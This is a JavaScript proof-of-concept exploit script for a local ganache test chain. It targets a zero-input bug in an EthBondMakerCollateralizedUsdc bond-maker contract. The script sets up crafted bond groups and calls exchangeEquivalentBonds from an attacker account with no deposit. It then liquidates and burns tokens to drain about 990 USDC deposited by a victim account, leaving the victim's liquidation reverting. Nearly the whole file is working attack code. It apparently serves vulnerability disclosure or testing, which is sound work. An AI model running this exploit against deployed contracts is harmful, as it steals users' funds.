/* PoC3: same zero-input bug on EthBondMakerCollateralizedUsdc (migrations/12). */
const { ethers } = require('ethers');
const ganache = require('ganache');
const artifacts = require('./artifacts.json');
const BN = ethers.BigNumber;
const fmt6 = (x) => x.toString() + ' (=' + (x.toNumber() / 1e6) + ' USDC)';
async function send(txPromise, tag) { const tx = await txPromise; const r = await tx.wait(); console.log(`  [tx] ${tag} gas=${r.gasUsed.toString()} status=${r.status}`); return r; }
function fnMap(points) { let prev = [0, 0]; const segs = []; for (const p of points) { segs.push(BN.from(prev[0]).shl(192).or(BN.from(prev[1]).shl(128)).or(BN.from(p[0]).shl(64)).or(BN.from(p[1])).toString()); prev = p; } return ethers.utils.defaultAbiCoder.encode(['uint256[]'], [segs]); }
async function main() {
  const gp = ganache.provider({ logging: { quiet: true }, chain: { allowUnlimitedContractSize: true }, miner: { blockGasLimit: 100_000_000, defaultGasPrice: 1_000_000_000 }, wallet: { totalAccounts: 6, defaultBalance: 1000 } });
  const provider = new ethers.providers.Web3Provider(gp);
  const [deployer, victim, attacker, feeTaker] = [provider.getSigner(0), provider.getSigner(1), provider.getSigner(2), provider.getSigner(3)];
  const VA = await victim.getAddress(), AA = await attacker.getAddress(), FA = await feeTaker.getAddress();
  const deploy = async (s, n, a = []) => { const f = new ethers.ContractFactory(artifacts[n].abi, artifacts[n].bytecode, s); const c = await f.deploy(...a); await c.deployTransaction.wait(); console.log(`  deployed ${n} @ ${c.address}`); return c; };
  const at = (n, a, s) => new ethers.Contract(a, artifacts[n].abi, s);

  const usdc = await deploy(deployer, 'TestUSDC', []);
  // inverse price = 1e16 / 2.5e13 = 400
  const oracle = await deploy(deployer, 'TestOracle', ['25000000000000', 0]);
  const inverse = await deploy(deployer, 'PriceInverseOracle', [oracle.address]);
  const namer = await deploy(deployer, 'BondTokenName', []);
  const factory = await deploy(deployer, 'BondTokenFactory', []);
  const maker = await deploy(deployer, 'EthBondMakerCollateralizedUsdc', [usdc.address, inverse.address, FA, namer.address, factory.address, 3600]);
  const now = (await provider.getBlock('latest')).timestamp;
  const maturity = (Math.floor(now / 3600) + 2) * 3600;
  const mAtk = at('EthBondMakerCollateralizedUsdc', maker.address, attacker);
  const mVic = at('EthBondMakerCollateralizedUsdc', maker.address, victim);

  async function regBond(points, label, s = attacker) { const m = at('EthBondMakerCollateralizedUsdc', maker.address, s); const fm = fnMap(points); const id = await m.generateBondID(maturity, fm); await send(m.registerNewBond(maturity, fm, { gasLimit: 20_000_000 }), 'register ' + label); return { id, token: (await m.getBond(id))[0] }; }
  const B = await regBond([[100, 49]], 'B'); const T = await regBond([[100, 2]], 'T');
  const C = await regBond([[100, 24]], 'C'); const R = await regBond([[100, 25]], 'R');
  const SBT = await regBond([[200, 200], [201, 200]], 'SBT', victim); const LBT = await regBond([[200, 0], [201, 1]], 'LBT', victim);
  async function regGroup(ids, label, s = attacker) { const m = at('EthBondMakerCollateralizedUsdc', maker.address, s); const gid = await m.callStatic.registerNewBondGroup(ids, maturity); await send(m.registerNewBondGroup(ids, maturity, { gasLimit: 20_000_000 }), 'group ' + label); return gid.toString(); }
  const G_IN = await regGroup([B.id, B.id, T.id], 'G_in'); const G_OUT = await regGroup([R.id, B.id, T.id, C.id], 'G_out');
  const G_VIC = await regGroup([SBT.id, LBT.id], 'G_vic', victim);

  const usdcV = at('TestUSDC', usdc.address, victim);
  await send(usdcV.mint(BN.from(1000_000000)), 'victim mint 1000 USDC (test token)');
  await send(usdcV.approve(maker.address, BN.from(1000_000000)), 'victim approve');
  await send(mVic.issueNewBonds(G_VIC, BN.from(1000_000000), { gasLimit: 20_000_000 }), 'victim issue 1000 USDC');
  console.log('Maker USDC balance:', fmt6(await usdcV.balanceOf(maker.address)), '| attacker USDC:', fmt6(await usdcV.balanceOf(AA)));

  const A = BN.from('396000000000'); // entitlement = A/100 * 0.25 = 990,000,000 = 990 USDC
  console.log('\n>>> zero-input exchangeEquivalentBonds');
  await send(mAtk.exchangeEquivalentBonds(G_IN, G_OUT, A, [B.id, T.id, C.id], { gasLimit: 20_000_000 }), 'EXPLOIT');
  await provider.send('evm_increaseTime', [maturity - now + 100]); await provider.send('evm_mine', []);
  await send(at('TestOracle', oracle.address, deployer).testSetOracleData('25000000000000', 0), 'oracle post-maturity');
  await send(mAtk.liquidateBond(G_OUT, 0, { gasLimit: 20_000_000 }), 'liquidate G_out');
  await send(at('BondTokenCollateralizedErc20', R.token, attacker).burnAll({ gasLimit: 20_000_000 }), 'burnAll R');
  const atkUsdc = await usdcV.balanceOf(AA);
  console.log('\n================ RESULT ================');
  console.log('Attacker USDC (deposited 0):', fmt6(atkUsdc));
  console.log('Maker USDC left:', fmt6(await usdcV.balanceOf(maker.address)));
  try { await send(mVic.liquidateBond(G_VIC, 0, { gasLimit: 20_000_000 }), 'victim liquidate'); console.log('victim liquidation unexpectedly succeeded'); }
  catch (e) { console.log('Victim liquidateBond REVERTED.'); }
  if (atkUsdc.lte(0)) process.exit(2);
  console.log('SUCCESS on USDC maker'); process.exit(0);
}
main().catch((e) => { console.error(e); process.exit(1); });
